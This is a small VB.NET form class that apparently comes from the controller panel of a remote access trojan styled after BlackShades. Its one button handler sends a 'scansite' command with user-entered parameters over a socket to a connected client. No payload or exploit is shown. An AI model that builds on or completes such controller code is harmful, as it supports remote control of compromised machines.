Public Class scanner
    Public sock As Integer
    Public jj As Integer = 0
    Private Sub BlackShadesNetButton1_Click(sender As System.Object, e As System.EventArgs) Handles BlackShadesNetButton1.Click
        '(TextBox1.Text, TextBox2.Text, TextBox3.Text)
        ListView1.Items.Clear()
        Form1.s.Send(sock, "scansite" & Form1.yy & TextBox1.Text & Form1.yy & TextBox2.Text & Form1.yy & TextBox3.Text)
    End Sub
End Class